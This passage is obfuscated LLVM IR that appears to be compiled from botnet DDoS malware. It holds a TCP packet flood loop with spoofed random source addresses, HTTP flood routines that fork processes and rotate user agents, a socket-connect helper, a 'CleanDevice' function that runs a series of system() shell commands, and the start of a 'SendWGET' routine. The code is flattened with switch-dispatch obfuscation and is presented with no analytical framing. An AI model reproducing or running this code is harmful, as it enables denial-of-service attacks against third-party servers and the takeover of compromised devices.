  %314 = icmp eq i32 %313, 0
  %315 = select i1 %314, i32 -2029462034, i32 1669403742
  store i32 %315, i32* %switchVar
  br label %loopEnd

; <label>:316:                                    ; preds = %loopEntry
  %317 = call i32 @rand_cmwc()
  store i32 -1948519406, i32* %switchVar
  store i32 %317, i32* %.reg2mem10
  br label %loopEnd

; <label>:318:                                    ; preds = %loopEntry
  %319 = load i32, i32* %9, align 4
  %320 = trunc i32 %319 to i16
  %321 = call zeroext i16 @htons(i16 zeroext %320) #10
  %322 = zext i16 %321 to i32
  store i32 -1948519406, i32* %switchVar
  store i32 %322, i32* %.reg2mem10
  br label %loopEnd

; <label>:323:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %324 = trunc i32 %.reload11 to i16
  %325 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %326 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %325, i32 0, i32 0
  %327 = bitcast %union.anon* %326 to %struct.anon.0*
  %328 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %327, i32 0, i32 1
  store i16 %324, i16* %328, align 2
  %329 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %330 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %331 = call zeroext i16 @tcpcsum(%struct.iphdr* %329, %struct.tcphdr* %330)
  %332 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %333 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %332, i32 0, i32 0
  %334 = bitcast %union.anon* %333 to %struct.anon.0*
  %335 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %334, i32 0, i32 6
  store i16 %331, i16* %335, align 4
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %336 = bitcast i8* %.reload8 to i16*
  %337 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %338 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %337, i32 0, i32 2
  %339 = load i16, i16* %338, align 2
  %340 = zext i16 %339 to i32
  %341 = call zeroext i16 @csum(i16* %336, i32 %340)
  %342 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i32 0, i32 7
  store i16 %341, i16* %343, align 2
  %344 = call i64 @time(i64* null) #5
  %345 = load i32, i32* %10, align 4
  %346 = sext i32 %345 to i64
  %347 = add nsw i64 %344, %346
  %348 = trunc i64 %347 to i32
  store i32 %348, i32* %24, align 4
  store i32 0, i32* %25, align 4
  store i32 1603394264, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  store i32 1688731027, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  %351 = load i32, i32* %17, align 4
  %352 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %353 = call i64 @sendto(i32 %351, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %352, i32 16)
  %354 = load i32, i32* %19, align 4
  %355 = call i32 @getRandomIP(i32 %354)
  %356 = call i32 @htonl(i32 %355) #10
  %357 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %358 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %357, i32 0, i32 8
  store i32 %356, i32* %358, align 4
  %359 = call i32 @rand_cmwc()
  %360 = trunc i32 %359 to i16
  %361 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %362 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %361, i32 0, i32 3
  store i16 %360, i16* %362, align 4
  %363 = call i32 @rand_cmwc()
  %364 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %365 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %364, i32 0, i32 0
  %366 = bitcast %union.anon* %365 to %struct.anon.0*
  %367 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %366, i32 0, i32 2
  store i32 %363, i32* %367, align 4
  %368 = call i32 @rand_cmwc()
  %369 = trunc i32 %368 to i16
  %370 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %371 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %370, i32 0, i32 0
  %372 = bitcast %union.anon* %371 to %struct.anon.0*
  %373 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %372, i32 0, i32 0
  store i16 %369, i16* %373, align 4
  %374 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %375 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %374, i32 0, i32 0
  %376 = bitcast %union.anon* %375 to %struct.anon.0*
  %377 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %376, i32 0, i32 6
  store i16 0, i16* %377, align 4
  %378 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %379 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %380 = call zeroext i16 @tcpcsum(%struct.iphdr* %378, %struct.tcphdr* %379)
  %381 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %382 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %381, i32 0, i32 0
  %383 = bitcast %union.anon* %382 to %struct.anon.0*
  %384 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %383, i32 0, i32 6
  store i16 %380, i16* %384, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %385 = bitcast i8* %.reload6 to i16*
  %386 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %387 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %386, i32 0, i32 2
  %388 = load i16, i16* %387, align 2
  %389 = zext i16 %388 to i32
  %390 = call zeroext i16 @csum(i16* %385, i32 %389)
  %391 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %392 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %391, i32 0, i32 7
  store i16 %390, i16* %392, align 2
  %393 = load i32, i32* %25, align 4
  %394 = load i32, i32* %15, align 4
  %395 = icmp eq i32 %393, %394
  %396 = select i1 %395, i32 973191482, i32 703627558
  store i32 %396, i32* %switchVar
  br label %loopEnd

; <label>:397:                                    ; preds = %loopEntry
  %398 = call i64 @time(i64* null) #5
  %399 = load i32, i32* %24, align 4
  %400 = sext i32 %399 to i64
  %401 = icmp sgt i64 %398, %400
  %402 = select i1 %401, i32 1278538911, i32 -496668568
  store i32 %402, i32* %switchVar
  br label %loopEnd

; <label>:403:                                    ; preds = %loopEntry
  store i32 2094240417, i32* %switchVar
  br label %loopEnd

; <label>:404:                                    ; preds = %loopEntry
  store i32 0, i32* %25, align 4
  store i32 1603394264, i32* %switchVar
  br label %loopEnd

; <label>:405:                                    ; preds = %loopEntry
  %406 = load i32, i32* %25, align 4
  %407 = add i32 %406, 1
  store i32 %407, i32* %25, align 4
  store i32 1603394264, i32* %switchVar
  br label %loopEnd

; <label>:408:                                    ; preds = %loopEntry
  %409 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %409)
  store i32 -1335778868, i32* %switchVar
  br label %loopEnd

; <label>:410:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %408, %405, %404, %403, %397, %350, %349, %323, %318, %316, %298, %297, %295, %294, %293, %292, %291, %290, %289, %281, %276, %268, %263, %255, %250, %242, %237, %229, %224, %216, %211, %207, %204, %189, %184, %169, %164, %121, %73, %67, %66, %62, %61, %55, %54, %47, %46, %40, %35, %31, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %.reg2mem = alloca %struct.hostent*
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %.reg2mem
  %.reload2 = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  store %struct.hostent* %.reload2, %struct.hostent** %6, align 8
  %switchVar = alloca i32
  store i32 1571495182, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1571495182, label %first
    i32 -471480, label %14
    i32 1069122935, label %15
    i32 -2039761709, label %38
    i32 -1617595346, label %39
    i32 -789676669, label %45
    i32 1779871350, label %46
    i32 303785990, label %48
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  %12 = icmp eq %struct.hostent* %.reload, null
  %13 = select i1 %12, i32 -471480, i32 1069122935
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 303785990, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load %struct.hostent*, %struct.hostent** %6, align 8
  %17 = getelementptr inbounds %struct.hostent, %struct.hostent* %16, i32 0, i32 4
  %18 = load i8**, i8*** %17, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %22 = bitcast %struct.in_addr* %21 to i8*
  %23 = load %struct.hostent*, %struct.hostent** %6, align 8
  %24 = getelementptr inbounds %struct.hostent, %struct.hostent* %23, i32 0, i32 3
  %25 = load i32, i32* %24, align 4
  %26 = sext i32 %25 to i64
  call void @bcopy(i8* %20, i8* %22, i64 %26) #5
  %27 = load i16, i16* %5, align 2
  %28 = call zeroext i16 @htons(i16 zeroext %27) #10
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %31, i32* %9, align 4
  %32 = load i32, i32* %9, align 4
  %33 = bitcast i32* %8 to i8*
  %34 = call i32 @setsockopt(i32 %32, i32 6, i32 1, i8* %33, i32 4) #5
  %35 = load i32, i32* %9, align 4
  %36 = icmp eq i32 %35, -1
  %37 = select i1 %36, i32 -2039761709, i32 -1617595346
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 303785990, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %9, align 4
  %41 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  %43 = icmp eq i32 %42, -1
  %44 = select i1 %43, i32 -789676669, i32 1779871350
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 303785990, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %9, align 4
  store i32 %47, i32* %3, align 4
  store i32 303785990, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %3, align 4
  ret i32 %49

loopEnd:                                          ; preds = %46, %45, %39, %38, %15, %14, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #5
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  %switchVar = alloca i32
  store i32 2055246945, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2055246945, label %24
    i32 -912971548, label %29
    i32 1572783217, label %43
    i32 -2129857003, label %44
    i32 -422847986, label %50
    i32 -732418204, label %57
    i32 737403230, label %68
    i32 1453293875, label %69
    i32 -1727603426, label %70
    i32 -147768947, label %71
    i32 599096489, label %74
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %14, align 4
  %26 = load i32, i32* %12, align 4
  %27 = icmp slt i32 %25, %26
  %28 = select i1 %27, i32 -912971548, i32 599096489
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %31 = load i8*, i8** %7, align 8
  %32 = load i8*, i8** %10, align 8
  %33 = load i8*, i8** %8, align 8
  %34 = call i32 @rand() #5
  %35 = srem i32 %34, 59
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [59 x i8*], [59 x i8*]* @uagents, i64 0, i64 %36
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 (i8*, i8*, ...) @sprintf(i8* %30, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.163, i32 0, i32 0), i8* %31, i8* %32, i8* %33, i8* %38) #5
  %40 = call i32 @fork() #5
  %41 = icmp ne i32 %40, 0
  %42 = select i1 %41, i32 1572783217, i32 -1727603426
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -2129857003, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %15, align 4
  %46 = sext i32 %45 to i64
  %47 = call i64 @time(i64* null) #5
  %48 = icmp sgt i64 %46, %47
  %49 = select i1 %48, i32 -422847986, i32 1453293875
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %8, align 8
  %52 = load i16, i16* %9, align 2
  %53 = call i32 @socket_connect(i8* %51, i16 zeroext %52)
  store i32 %53, i32* %13, align 4
  %54 = load i32, i32* %13, align 4
  %55 = icmp ne i32 %54, 0
  %56 = select i1 %55, i32 -732418204, i32 737403230
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %13, align 4
  %59 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %60 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %61 = call i64 @strlen(i8* %60) #9
  %62 = call i64 @write(i32 %58, i8* %59, i64 %61)
  %63 = load i32, i32* %13, align 4
  %64 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %65 = call i64 @read(i32 %63, i8* %64, i64 1)
  %66 = load i32, i32* %13, align 4
  %67 = call i32 @close(i32 %66)
  store i32 737403230, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 -2129857003, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  call void @exit(i32 0) #12
  unreachable

; <label>:70:                                     ; preds = %loopEntry
  store i32 -147768947, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %14, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %14, align 4
  store i32 2055246945, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %71, %70, %68, %57, %50, %44, %43, %29, %24, %switchDefault
  br label %loopEntry
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @SendHTTPHEX(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  %19 = alloca [2048 x i8], align 16
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %20 = call i64 @time(i64* null) #5
  %21 = load i32, i32* %11, align 4
  %22 = sext i32 %21 to i64
  %23 = add nsw i64 %20, %22
  %24 = trunc i64 %23 to i32
  store i32 %24, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %25 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %26 = call i32 (i8*, i8*, ...) @sprintf(i8* %25, i8* getelementptr inbounds ([285 x i8], [285 x i8]* @.str.164, i32 0, i32 0)) #5
  store i32 0, i32* %14, align 4
  %switchVar = alloca i32
  store i32 -1837926616, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1837926616, label %27
    i32 692660450, label %32
    i32 -1835200150, label %46
    i32 -788561732, label %47
    i32 -487379504, label %53
    i32 86541882, label %60
    i32 -1829554586, label %71
    i32 -1342113039, label %72
    i32 -669354018, label %73
    i32 1500208096, label %74
    i32 -1456736829, label %77
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %14, align 4
  %29 = load i32, i32* %12, align 4
  %30 = icmp slt i32 %28, %29
  %31 = select i1 %30, i32 692660450, i32 -1456736829
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %34 = load i8*, i8** %7, align 8
  %35 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %36 = load i8*, i8** %8, align 8
  %37 = call i32 @rand() #5
  %38 = srem i32 %37, 59
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [59 x i8*], [59 x i8*]* @uagents, i64 0, i64 %39
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 (i8*, i8*, ...) @sprintf(i8* %33, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.163, i32 0, i32 0), i8* %34, i8* %35, i8* %36, i8* %41) #5
  %43 = call i32 @fork() #5
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 -1835200150, i32 -669354018
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 -788561732, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* %15, align 4
  %49 = sext i32 %48 to i64
  %50 = call i64 @time(i64* null) #5
  %51 = icmp sgt i64 %49, %50
  %52 = select i1 %51, i32 -487379504, i32 -1342113039
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i8*, i8** %8, align 8
  %55 = load i16, i16* %9, align 2
  %56 = call i32 @socket_connect(i8* %54, i16 zeroext %55)
  store i32 %56, i32* %13, align 4
  %57 = load i32, i32* %13, align 4
  %58 = icmp ne i32 %57, 0
  %59 = select i1 %58, i32 86541882, i32 -1829554586
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %13, align 4
  %62 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %63 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %64 = call i64 @strlen(i8* %63) #9
  %65 = call i64 @write(i32 %61, i8* %62, i64 %64)
  %66 = load i32, i32* %13, align 4
  %67 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %68 = call i64 @read(i32 %66, i8* %67, i64 1)
  %69 = load i32, i32* %13, align 4
  %70 = call i32 @close(i32 %69)
  store i32 -1829554586, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  store i32 -788561732, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  call void @exit(i32 0) #12
  unreachable

; <label>:73:                                     ; preds = %loopEntry
  store i32 1500208096, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i32, i32* %14, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %14, align 4
  store i32 -1837926616, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %74, %73, %71, %60, %53, %47, %46, %32, %27, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTPTXT(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  %19 = alloca [2048 x i8], align 16
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %20 = call i64 @time(i64* null) #5
  %21 = load i32, i32* %11, align 4
  %22 = sext i32 %21 to i64
  %23 = add nsw i64 %20, %22
  %24 = trunc i64 %23 to i32
  store i32 %24, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %25 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %26 = call i32 (i8*, i8*, ...) @sprintf(i8* %25, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.165, i32 0, i32 0)) #5
  store i32 0, i32* %14, align 4
  %switchVar = alloca i32
  store i32 -477982001, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -477982001, label %27
    i32 -1458923217, label %32
    i32 -415589526, label %46
    i32 1276151478, label %47
    i32 -318361851, label %53
    i32 -686197793, label %60
    i32 -1578650034, label %71
    i32 2007908425, label %72
    i32 730167942, label %73
    i32 671464152, label %74
    i32 -1030649836, label %77
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %14, align 4
  %29 = load i32, i32* %12, align 4
  %30 = icmp slt i32 %28, %29
  %31 = select i1 %30, i32 -1458923217, i32 -1030649836
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %34 = load i8*, i8** %7, align 8
  %35 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %36 = load i8*, i8** %8, align 8
  %37 = call i32 @rand() #5
  %38 = srem i32 %37, 59
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [59 x i8*], [59 x i8*]* @uagents, i64 0, i64 %39
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 (i8*, i8*, ...) @sprintf(i8* %33, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.163, i32 0, i32 0), i8* %34, i8* %35, i8* %36, i8* %41) #5
  %43 = call i32 @fork() #5
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 -415589526, i32 730167942
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1276151478, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* %15, align 4
  %49 = sext i32 %48 to i64
  %50 = call i64 @time(i64* null) #5
  %51 = icmp sgt i64 %49, %50
  %52 = select i1 %51, i32 -318361851, i32 2007908425
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i8*, i8** %8, align 8
  %55 = load i16, i16* %9, align 2
  %56 = call i32 @socket_connect(i8* %54, i16 zeroext %55)
  store i32 %56, i32* %13, align 4
  %57 = load i32, i32* %13, align 4
  %58 = icmp ne i32 %57, 0
  %59 = select i1 %58, i32 -686197793, i32 -1578650034
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %13, align 4
  %62 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %63 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %64 = call i64 @strlen(i8* %63) #9
  %65 = call i64 @write(i32 %61, i8* %62, i64 %64)
  %66 = load i32, i32* %13, align 4
  %67 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %68 = call i64 @read(i32 %66, i8* %67, i64 1)
  %69 = load i32, i32* %13, align 4
  %70 = call i32 @close(i32 %69)
  store i32 -1578650034, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  store i32 1276151478, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  call void @exit(i32 0) #12
  unreachable

; <label>:73:                                     ; preds = %loopEntry
  store i32 671464152, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i32, i32* %14, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %14, align 4
  store i32 -477982001, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %74, %73, %71, %60, %53, %47, %46, %32, %27, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @CleanDevice() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.166, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.167, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.168, i32 0, i32 0))
  %4 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.169, i32 0, i32 0))
  %5 = call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.170, i32 0, i32 0))
  %6 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.171, i32 0, i32 0))
  %7 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.172, i32 0, i32 0))
  %8 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.173, i32 0, i32 0))
  %9 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.174, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.175, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.176, i32 0, i32 0))
  %12 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.177, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.178, i32 0, i32 0))
  ret void
}

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @SendWGET(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct._IO_FILE*, align 8
  %7 = alloca [80 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %8 = call i64 @time(i64* null) #5
  %9 = load i32, i32* %4, align 4
  %10 = sext i32 %9 to i64
  %11 = add nsw i64 %8, %10
  %12 = trunc i64 %11 to i32
  store i32 %12, i32* %5, align 4
  %13 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %14 = call i32 (i8*, i8*, ...) @sprintf(i8* %13, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.179, i32 0, i32 0)) #5
  %15 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %16 = load i8*, i8** %3, align 8
